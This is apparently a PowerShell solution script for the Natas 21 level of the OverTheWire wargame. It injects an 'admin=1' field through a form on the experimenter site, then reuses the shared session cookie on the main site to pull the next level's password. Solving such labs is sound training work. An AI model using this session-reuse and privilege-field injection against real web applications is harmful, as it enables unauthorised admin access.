$Init = 20
$Username = 'natas' + ($Init + 1)
$Password = Get-Content -Path ../../../etc/otw/natas.pass | Select-Object -Skip $Init | Select-Object -First 1
$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))
$UriOg = "http://$Username.natas.labs.overthewire.org/?debug=true"
$UriExp = "http://$Username-experimenter.natas.labs.overthewire.org/?debug=true&submit=1"

$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$Request = @{
	Uri = $UriExp
	Headers = @{ Authorization = "Basic $Creds" }
	WebSession = $Session
}

function Invoke-Get {
	param (
		[string]$Uri,
		[string]$Cookie = ''
	)

	$Request['Uri'] = $Uri
	$Request['Method'] = 'GET'

	if ($Cookie -ne '') {
		$Request.Headers['Cookie'] = "PHPSESSID=$Cookie"
	}

	return Invoke-WebRequest @Request
}

function Invoke-Post {
	param (
		[string]$Uri
	)

	$Request['Uri'] = $Uri
	$Request['Method'] = 'POST'
	$Request['Body'] = @{
		align = 'center'
		fontsize = '100%'
		bgcolor = 'yellow'
		admin = 1
	}

	return Invoke-WebRequest @Request
}

Invoke-Post -Uri $UriExp | Out-Null
$PhpSessId = $Request.WebSession.Cookies.GetAllCookies()['PHPSESSID'].Value
$Res = Invoke-Get -Uri $UriOg -Cookie $PhpSessId | Select-Object -ExpandProperty Content

$Natas21 = ($Res | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -first 1).Matches.Groups[1].Value
Write-Host -ForegroundColor Green "Password: $Natas21"
